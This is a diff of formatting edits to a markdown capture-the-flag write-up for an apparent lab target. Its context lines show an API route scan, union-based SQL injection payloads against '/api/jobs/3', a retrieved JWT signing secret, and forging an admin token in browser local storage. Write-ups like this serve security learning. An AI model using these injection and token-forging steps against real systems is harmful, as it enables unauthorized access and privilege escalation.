@@ -63,8 +63,9 @@ kr scan $target  -w medium-admin-api-routes.kite -H $token -x 20  --wildcard-det
 
 ```
 >[!NOTE]
-When I ran **kr** I use a custom admin list, which is a normal wordlist.txt but we have to convert to **.kite** so we can use it, the command below convert a normal .txt to .kite
-`kr kb convert wordlist.txt wordlist.kite`
+>When I ran **kr** I use a custom admin list, which is a normal wordlist.txt but we have to convert to 
+>*.kite** so we can use it, the command below convert a normal .txt to .kite
+>`kr kb convert wordlist.txt wordlist.kite`
 
 
 | Flags                      | Description                                                        |
@@ -152,7 +153,7 @@ We need to understand where our point of injection will be so we find the column
 GET /api/jobs/3 order by 16--
 ```
 >[!Response]
-No error
+>No error
 ```r
 GET /api/jobs/3 order by 17--
 ```
@@ -208,7 +209,7 @@ GET /api/jobs/3 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,key||':'||value
 >[..retracted..]
 "application_count":"phonesCheeseTiramisu1199"
 
-# **JWT Secret retrieve !**
+### **JWT Secret retrieve !**
 
 
 ---
@@ -223,6 +224,7 @@ Once the Signing Key is created, we can modify our token to have admin role agai
 
 With the new token we can update our token again on the Web Browser Local Storage and try loading the page again.
 ![[Pasted image 20260112001110.png]]
+**PWNED~**
 [^1]: Thank you  for the write up [ruur](https://ruur.gitbook.io/) and help with the sql section
 #Pwned #writeup #bugforge 
 
